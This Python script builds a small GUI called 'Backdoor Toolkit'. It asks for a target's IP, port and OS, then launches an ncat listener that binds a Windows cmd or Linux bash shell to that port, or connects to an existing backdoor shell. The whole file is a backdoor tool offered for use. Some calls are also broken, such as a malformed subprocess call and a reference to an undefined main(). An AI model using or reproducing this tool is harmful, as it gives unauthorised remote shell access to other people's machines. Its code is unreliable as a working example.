import tkinter as tk
import subprocess

def run_script():
    # Get the values from the input fields
    target_ip = input1_field.get()
    target_port = input2_field.get()
    target_shell = input3_field.get()

    # Run the script with the input values
    windows_shell = "cmd"
    linux_shell = "/bin/bash -i"

    windows = windows_shell
    linux = linux_shell

    if target_shell == "windows" or target_shell == "WINDOWS" or target_shell == "Windows":
        target_shell = windows
    elif target_shell == "linux" or target_shell == "LINUX" or target_shell == "Linux":
        target_shell = linux

    def spawn_backdoor(target_port, target_shell):
        print("Now spawning Netcat Backdoor on", target_ip, "and port #", target_port)
        subprocess.call(["ncat", "-l", "-vv", "-k", "-p"+target_port, "-e"+target_shell])

    def connect_backdoor(target_ip, target_port):
        print("Initiating connection with target backdoor")
        print("TARGET IP:"+target_ip)
        print("TARGET PORT:"+target_port)
        subprocess.call("ncat", target_ip, target_port)

    def existing_backdoor():
        backdoor_connect = input("Would you like to communicate with an existing backdoor? \nYES or NO: ")
        if backdoor_connect == "YES" or backdoor_connect == "Yes" or backdoor_connect == "yes":
            print("Initiating connection with backdoor shell now.")
            subprocess.call(["ncat", target_ip, target_port])
        elif backdoor_connect == "NO" or backdoor_connect == "no" or backdoor_connect == "No":
            print("Thanks for using Backdoor Toolkit!")
            return main()

    backdoor_choice = input("Would you like to spawn the backdoor now? \nYES or NO: ")
    if backdoor_choice == "yes" or backdoor_choice == "YES" or backdoor_choice == "Yes":
        spawn_backdoor(target_port, target_shell)
    elif backdoor_choice == "no" or backdoor_choice == "NO" or backdoor_choice == "No":
        existing_backdoor()

# Create the main window
window = tk.Tk()
window.title("Backdoor Toolkit")

# Create the input fields
input1_label = tk.Label(window, text="Type the target's IP Address and press enter:")
input1_label.grid(row=0, column=0, padx=5, pady=5)
input1_field = tk.Entry(window)
input1_field.grid(row=0, column=1, padx=5, pady=5)

input2_label = tk.Label(window, text="Type the target's Port Number and press enter:")
input2_label.grid(row=1, column=0, padx=5, pady=5)
input2_field = tk.Entry(window)
input2_field.grid(row=1, column=1, padx=5, pady=5)

input3_label = tk.Label(window, text="Is the target a Windows or Linux device?")
input3_label.grid(row=2, column=0, padx=5, pady=5)
input3_field = tk.Entry(window)
input3_field.grid(row=2, column=1, padx=5, pady=5)

# Create the "Run" button
run_button = tk.Button(window, text="Run Script", command=run_script)
run_button.grid(row=3, column=0, columnspan=2, padx=5, pady=5)

window.mainloop()
